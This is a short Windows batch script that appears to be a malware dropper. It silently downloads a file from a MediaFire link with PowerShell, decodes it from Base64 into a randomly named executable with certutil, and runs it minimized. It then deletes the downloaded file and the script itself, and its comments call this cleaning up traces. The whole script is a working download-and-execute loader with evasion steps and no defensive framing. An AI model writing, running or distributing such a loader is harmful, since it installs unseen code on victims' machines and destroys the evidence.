@echo off
setlocal enabledelayedexpansion

rem Generate random file names
set "filename1=%random%%random%.txt"
set "filename2=%random%%random%.exe"

rem Download the file silently using PowerShell
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://download1592.mediafire.com/tzhzw38f69vggB0VEUD5KaPopp-ppa9Eu-P84gHAa6VGunCDlAVWLF6WXPCliP0gOyo9A2WCgd7GfdQc-qlPnHR51y-e9rZONGcwt4JptG7XQIPudItPbEvwdpTVxhxFWKhX9rwTYy53NWq5vUrd9wx3bCyXl8G0Dsb0BlL6uUcTXA/08cpmqji60kocpz/output.txt', '!filename1!')"

rem Decode Base64 to executable silently
certutil -decode !filename1! !filename2! >nul 2>&1

rem Execute the executable silently
start /min "" !filename2!

rem Clean up traces
del /f /q !filename1!
del /f /q "%~f0"

endlocal
